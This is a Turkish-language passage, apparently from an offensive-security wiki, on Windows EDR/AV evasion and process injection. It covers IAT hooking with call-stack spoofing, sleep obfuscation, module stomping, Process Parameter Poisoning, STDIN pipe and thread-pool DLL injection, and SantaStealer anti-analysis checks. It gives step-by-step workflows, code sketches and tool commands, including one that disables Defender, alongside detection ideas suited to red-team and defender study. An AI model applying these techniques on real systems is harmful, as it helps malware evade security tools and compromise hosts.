- Hizmeti durdurma/hizmet reddi: Sürüm symlink’ini kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını; admin hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team'ler, runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ı (IAT) hook'lanır ve seçilen API'ler saldırganın kontrolündeki, konumdan bağımsız koda (PIC) yönlendirilir. Bu yöntem, evasion'ı birçok kitin sunduğu sınırlı API kapsamının (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yükleyin (başına eklenmiş veya eşlik eden). PIC kendi kendine yeterli ve konumdan bağımsız olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde ilerleyin ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girişlerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper'ı, gerçek API adresine tail-call yapmadan önce evasion işlemlerini yürütür. Yaygın evasion işlemleri şunlardır:
  - Çağrı sırasında belleği maskeleme/maskelemeyi kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme) ve ardından eski hâline döndürme.
  - Call-Stack Spoofing: iyi huylu bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'inin (veya benzerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilmesini sağlayan bir arayüz dışa aktarın.

Burada IAT hooking kullanmanın nedenleri
- Hook'lanan import'u kullanan tüm kodlarda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemesi için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve bu modüllerin API çağrılarına aynı maskeleme/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W'yi wrapper'layarak, call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ sözde kodu)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yamayı relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader’lar, yüklenen modülün DllMain’i sırasında hooking yapıldığını gösterir.
- Wrapper’ları küçük ve PIC-safe tutun; gerçek API’yi yamadan önce yakaladığınız özgün IAT değeri veya LdrGetProcedureAddress aracılığıyla çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub’ları sahte bir çağrı zinciri (benign modüllere ait return address’ler) oluşturup ardından gerçek API’ye geçiş yapar.
- Bu, Beacon/BOF’lardan hassas API’lere giden canonical stack’ler bekleyen tespitleri etkisiz kılar.
- API prologue’una ulaşmadan önce beklenen frame’lerin içine yerleşmek için bunu stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook’ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader’ı post-ex DLL’lerin başına ekleyin.
- Hedef API’leri kaydetmek için bir Aggressor script kullanın; böylece Beacon ve BOF’lar kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanır.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışındaki (heap/anon) adreslere çözümlenen girdiler; import pointer’larının periyodik doğrulanması.
- Stack anormallikleri: yüklü image’lere ait olmayan return address’ler; image dışı PIC’e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetrisi: süreç içinden IAT’ye yazma; import thunk’larını değiştiren erken DllMain etkinliği; yükleme sırasında oluşturulan beklenmeyen RX bölgeleri.
- Image-load evasion: LoadLibrary* hooking yapılıyorsa, bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader’lar (ör. TitanLdr, AceLdr)
- Memory masking hook’ları (ör. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub’ları (ör. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO üzerinden import-time IAT hook’ları

Bir reflective loader’ı kontrol ediyorsanız, loader’ın `GetProcAddress` pointer’ını önce hook’ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import’ları hook’layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da yaşamaya devam eden bir **resident PICO** (persistent PIC object) oluşturun.
- Loader’ın import resolver’ını üzerine yazan bir `setup_hooks()` fonksiyonu export edin (ör. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import’ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress` işlevine devredin.
- Hook hedeflerini link zamanında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, resident PICO içinde bulunduğu için geçerliliğini korur.

Bu yöntem, yüklenen DLL’in code section’ını yükleme sonrasında patch’lemeden **import-time IAT redirection** sağlar.

### Hedef PEB-walking kullandığında hook’lanabilir import’ları zorlama

Import-time hook’lar yalnızca fonksiyon hedefin IAT’sinde gerçekten yer alıyorsa çalışır. Bir modül API’leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), gerçek bir import oluşturarak loader’ın `ProcessImports()` yolunun bu import’u görmesini sağlayın:

- Hash’lenmiş export çözümlemesini (ör. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir ve reflective loader import’ları çözümlerken interception mümkün olur.

### `Sleep()` işlevini patch’lemeden Ekko tarzı uyku/boşta kalma obfuscation’ı

`Sleep` işlevini patch’lemek yerine, implantın kullandığı **gerçek wait/IPC primitive’lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook’layın. Uzun beklemelerde, boşta kalma sırasında bellekteki image’i şifreleyen Ekko tarzı bir obfuscation zincirini çağrının etrafına sarın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame’leriyle çağıran callback’ler dizisini planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image’i `PAGE_READWRITE` olarak ayarlayın → eşlenmiş image’in tamamında `advapi32!SystemFunction032` ile RC4 şifrelemesi yapın → bloklayan wait işlemini gerçekleştirin → RC4 ile şifreyi çözün → PE section’larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir şablon `CONTEXT` sağlar; bunu birden fazla frame’e kopyalayın ve her adımı çağırmak için register’ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Image maskelenmiş durumdayken çağıranın devam etmesini sağlamak için uzun beklemelerde (ör. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, boşta kalınan aralıklarda modülü scanner’lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue` işlevini çağıran `CreateTimerQueueTimer` callback’lerinde art arda kümelenmeler.
- Büyük, bitişik ve image boyutundaki buffer’larda kullanılan `advapi32!SystemFunction032`.
- Büyük aralıklı `VirtualProtect` çağrısını izleyen özel section başına izin geri yüklemesi.

### Sleep-obfuscation gadget’ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget’a yapılan ilk indirect jump genellikle süreci `STATUS_STACK_BUFFER_OVERRUN` hatasıyla çökertir; çünkü gadget modülün CFG metadata’sında yer almaz. Ekko/Kraken tarzı zincirleri güçlendirilmiş süreçlerde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination’ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image’lerin (`ntdll`, `kernel32`, `advapi32`) içindeki adresler için `MEMORY_RANGE_ENTRY`, **image base**’ten başlamalı ve **image’in tamamını** kapsamalıdır.
- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget’ını değil, dolaylı olarak ulaşılan export’ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall’ları) ve dolaylı hedef hâline gelecek saldırgan denetimindeki çalıştırılabilir section’ları da işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `/guard:cf` ile derlenen `explorer.exe`, browser’lar, `svchost.exe` ve diğer endpoint’lerde kullanılabilir bir primitive’e dönüştürür.

### Uyuyan thread’ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirme işlemi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş bir `Rip`, donanımsal shadow stack ile hâlâ eşleşmelidir. Daha güvenli bir sleep-masking yöntemi şöyledir:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread’i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread’in gerçek TEB/TIB’sini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Spoof bağlamına yalnızca gerçek `Rip` değerini kopyalayın; spoof edilmiş `Rsp`/stack durumunu olduğu gibi bırakın.
- Uyku aralığında, stack walker’ların geçerli bir stack aralığının içinde unwind yapması için spoof thread’in `NT_TIB`’sini mevcut TEB’ye kopyalayın.
- Wait tamamlandıktan sonra özgün TIB’yi ve thread context’ini geri yükleyin.

Bu yöntem CET ile uyumlu bir instruction pointer’ı korurken, unwind doğrulaması için TEB stack metadata’sına güvenen EDR stack walker’larını yanıltır.

### APC tabanlı alternatif: Kraken Mask

Timer-queue dispatch’in imzası fazla belirginse, aynı sleep-encrypt-spoof-restore dizisi queued APC’ler kullanılarak askıya alınmış bir yardımcı thread’den yürütülebilir:<sup>[[27]](#references)</sup>

- Giriş noktası `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame’lerini/APC’leri `NtQueueApcThread` ile sıraya alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack’ini tüketmemek için zincir durumunu yardımcı stack’i yerine heap’te saklayın.
- Başlangıç event’ini atomik olarak bildirmek ve bloklamak için `NtSignalAndWaitForSingleObject` kullanın.
- Bir scanner’ın yarı geri yüklenmiş bir stack’i yakalayabileceği race window’u daraltmak için TIB/context’i geri yüklemeden önce ana thread’i askıya alın (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Uyku, wait veya APC dispatch işlemlerinden kısa süre önce kullanılan `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısını izleyen ve mevcut thread’in TEB/TIB stack sınırlarına doğrudan yazan işlemler.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper’larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerde dispatch pivot’ları olarak kısa gadget imzalarının (ör. `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`)) tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine, payload’ları hedef süreçte zaten eşlenmiş bir DLL’in **`.text` section’ından** çalıştırır. Üzerine yazılacak hedef, sürecin hâlâ ihtiyaç duyduğu code path’leri bozmadan payload’ı barındırabilecek **yüklü, disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere karşı yapılan basit stomping güvenilir değildir: DLL uzak süreçte yüklenmemiş olabilir ve fazla küçük bir code region süreci çökertir. Daha güvenilir bir iş akışı şöyledir:

1. Hedef süreç modüllerini listeleyin ve **yalnızca adlardan oluşan** bir include list’te zaten yüklü olan DLL’leri tutun.
2. Önce payload’ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Aday DLL’leri diskte tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü **belleğe eşlendiğindeki** çalıştırılabilir section boyutunu gösterir.
4. **Export Address Table (EAT)**’i parse edin ve stomp başlangıç offset’i olarak bir export edilmiş fonksiyon RVA’sı seçin.
5. **Blast radius**’u hesaplayın: payload seçilen fonksiyon sınırını aşarsa, bellekte ondan sonra yer alan bitişik export’ların üzerine yazar.

Sahada görülen tipik recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasyonel notlar
- `LoadLibrary` / beklenmeyen image yüklemelerinin telemetrisinden kaçınmak için uzak process'te **zaten yüklü** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler thread oluşturulmadan önce veya sonra stomped byte'lara erişebilir.
- Büyük implant'lar, injector source'unda buffer'ın tamamının doğru şekilde temsil edilmesi için shellcode'un bir string literal yerine **byte-array/braced initializer** olarak gömülmesini gerektirebilir.

Tespit fikirleri
- Yaygın private RWX/RX allocation'lar yerine **image-backed executable page**'lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan uzak yazmalar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- Yakın zamanda ilk byte'ları değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread oluşturulan şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolundan (`VirtualAllocEx` + `WriteProcessMemory`) kaçınan bir **process-injection / EDR-evasion** tekniğidir. Çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklamasından yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleğe** işaret etmelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, kararlı ve belgelenmiş bir sözleşme yerine implementation detail olarak değerlendirilmelidir.

Bu yaklaşım, normal process oluşturma işlemini **payload-transfer primitive** haline getirir. Operatör, child process'i saldırgan kontrollü başlangıç verileriyle oluşturur ve Windows'un process'ler arası kopyalamayı gerçekleştirmesini sağlar.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **salt okunur** primitive'lerle bulabilirsiniz:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters` işaretçisini takip edin
4. `RTL_USER_PROCESS_PARAMETERS` yapısını okuyun
5. Seçilen işaretçiyi kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre tamponunu yürütme

Kopyalanan parametre bölgesi genellikle `RW`'dir, yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluştur (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` kullanarak seçilen parametre sayfasını yürütülebilir yap
3. `PROCESS_INFORMATION` tarafından zaten döndürülen ana thread handle'ını yeniden kullan
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i üzerine yaz) ile yürütmeyi yönlendir

Klasik thread hijacking iş akışlarından farklı olarak, bu yöntem `SuspendThread` / `ResumeThread` gerektirmez; döndürülen ana thread handle'ı üzerinde bağlam doğrudan değiştirilebilir.

Bu, injection için yaygın olarak izlenen birkaç API'nin kullanılmasını önler:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null-byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının tamamı **string veya string benzeri veriler** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Pratik bir çözüm, sabit değerleri çalışma zamanında yeniden oluşturan ve ardından isteğe bağlı bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir örüntü, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL path'lerini veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

Böylece ikinci aşama stack'ten `PAGE_READWRITE` tahsisine kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX tahsisi yapmadan çalıştırılabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory` çağrıları
- bu koruma değişikliğinin ardından gelen `SetThreadContext` / `NtSetContextThread`
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için yapılan uzak okumalar
- process oluşturulurken alışılmadık derecede uzun / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, **process'ler arası bir aktarım tekniğidir**; tek başına tam bir execution primitive değildir: kopyalanan parametre hâlâ execute izni değişikliğine ve bir execution redirection yöntemine ihtiyaç duyar.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlar tarafından değerlendirildi ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere başvurduğu için reddedildi.

## Console STDIN pipe injection

Etkileşimli bir console child, **payload-transfer primitive** olarak da kullanılabilir. Injector, child'ın standard input'unu bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'i buraya yönlendirir. Bu, `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak genel bir EDR bypass'ı değil, process injection yöntemidir.<sup>[[41]](#references)</sup>

"Named-pipe" açıklamasına rağmen referans uygulama, **anonymous pipe** oluşturan `CreatePipe`'ı çağırır. Windows, anonymous pipe'ları dahili olarak benzersiz adlandırılmış pipe nesneleriyle uygular; ancak PoC ne bir `\\.\pipe\<name>` path'i seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir security descriptor ile inherit edilebilir handle'lar oluşturur, read handle'ı `STARTUPINFO.hStdInput` alanına yerleştirir, `STARTF_USESTDHANDLES` değerini ayarlar ve handle inheritance etkinleştirilmiş yeni bir child başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir process'e bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT` akışları için anonymous pipe çiftleri oluştur. İki parent tarafındaki handle'ın inheritance özelliğini temizle ve process oluşturulduktan sonra child tarafındaki kopyaları parent'ta kapat.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlat. Child, yönlendirilmiş standard handle'ları devralır.
3. Tam ikili `rawData` dizisini parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile gönder. Console programı byte'ları tüketir ve bir kopyasını kendi özel commit edilmiş bölgelerinden birinde bırakır.
4. Child'ın adres alanında `VirtualQueryEx` ile gezin, `ReadProcessMemory` kullanarak aday `MEM_PRIVATE` bölgelerini oku ve `rawData`'nın başlangıcındaki marker'ı ara.
5. Bulunan buffer'ın korumasını `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştir.
6. Ana thread'i belirle, suspend et, `NtSetContextThread` ile `RIP`'yi `found_address + 0x19` olarak ayarla ve thread'i resume et.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özeldir: `CONTEXT.Rip` değerini değiştirir ve içine gömülü payload, x64 shellcode'dur. `rawData`, 25 baytlık bir işaretleyiciyle başlar; bu nedenle yürütülebilir baytlar hexadecimal `0x19` offset'inde başlar. Payload'u değiştirirken bu düzeni koruyun ya da işaretleyiciyi, arama vektörünü, dizi boyutunu ve yürütme offset'ini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` da bad character olarak listelenmiştir. Bu workflow, çocuğun token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için bkz. [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Shellcode kullanmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection yöntemini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ını yürütmesi yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef pool'un I/O completion port'una kuyruğa alınan bir `TP_DIRECT`'tir. Bu yöntem process izinlerini bypass etmez: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağrısı yapar ve okunabilir/yazılabilir hedef belleğe, ayrıca kopyalanabilir worker-factory ve completion-port handle'larına ihtiyaç duyar.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack üzerinde bulunan `TP_CALLBACK_INSTANCE` işaretçisini ilk callback argümanı olarak `RCX` üzerinden iletir. `LoadLibraryA`, aynı işaretçiyi bir `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` konumunda oluştururken bu nesneye yaptığı ilk sıradan yazma `RSP+0x1d0` konumundadır. Bu nedenle, `0x58` baytlık bu öneke sığan null ile sonlandırılmış bir DLL yolu, dispatch öncesinde üzerine yazılmadan instance'ın başlangıcında yer alabilir. Bu, belirli bir build'de gözlemlenmiş bir durumdur; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans workflow şöyledir:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` ile hedefin handle'larını listeleyin ve nesne türlerini sorgulayarak `TpWorkerFactory`'yi belirleyin. Bir worker-factory handle'ını kopyalayın ve `WorkerFactoryBasicInformation` sorgulayın; `StartParameter`, uzak `TP_POOL` değerini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
2. `TP_POOL.CompletionPort` değerini okuyun ve pool'un özel worker listesini dolaşın. Test edilen Windows 10 19045 x64 build'inde (`ntdll.dll 10.0.19041.4842`) listenin başı `pool+0x60` konumundadır; her bağlantı `worker+0x10` konumundadır; dolayısıyla `worker+0x38` konumundaki callback-instance slot'u `link+0x28` değerine eşittir. PoC; pointer hizalamasını, bağlantıların karşılıklılığını, pool sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve sabit bir liste başını denetler.
3. Kuyruğa alınmış completion herhangi bir worker tarafından tüketilebileceğinden, DLL yolunu bulunan **her** worker slot'una yazın. `Callback = LoadLibraryA` içeren bir `TP_DIRECT`'i hedef bellekte yazılabilir bir konuma yerleştirin. PoC, `VirtualAllocEx` yerine worker stack'inde `last_slot-0x500` konumunu kullanır; bu offset deneysel niteliktedir ve etkin stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını kopyalayın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısını yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker, üzerine yazılmış callback-instance işaretçisini `LoadLibraryA`'ya geçirerek hedefin erişebildiği bir DLL'i yükler.

PoC, hedef PID'sini (`DLLParty.exe <target_pid>`) alır ve `DLLParty.cpp` içinde sabit kodlanmış bir DLL yolu kullanır; x64 executable'ı derlemeden önce hedefin erişebileceği bir yol belirleyin. Ayrıca kendi process'indeki `LoadLibraryA` adresini uzak callback olarak kullandığından, bu adresin hedefte de geçerli olduğunu varsayar. Kod, yol uzunluğunu `0x58` baytlık önekle karşılaştırmaz veya son elemana erişmeden önce worker dolaşımının bir slot bulduğunu doğrulamaz. Hedef build için özel offset'leri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanmamak, process'ler arası yazmaları veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access yöntemlerini tek bir workflow'da nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout denetimi ve sandbox gecikmesi

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` üzerinden yüklü keyboard layout'larını listeler. Cyrillic bir layout bulunursa örnek, boş bir `CIS` işaretleyicisi bırakır ve stealer'ları çalıştırmadan sonlanır. Böylece hariç tutulan locale'lerde çalışması engellenirken, avlanma için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- A varyantı süreç listesini dolaşır, her adı özel bir kayan checksum ile hash’ler ve sonucu hata ayıklayıcılar/kum havuzları için gömülü engelleme listeleriyle karşılaştırır; bilgisayar adı için de checksum hesaplamasını tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
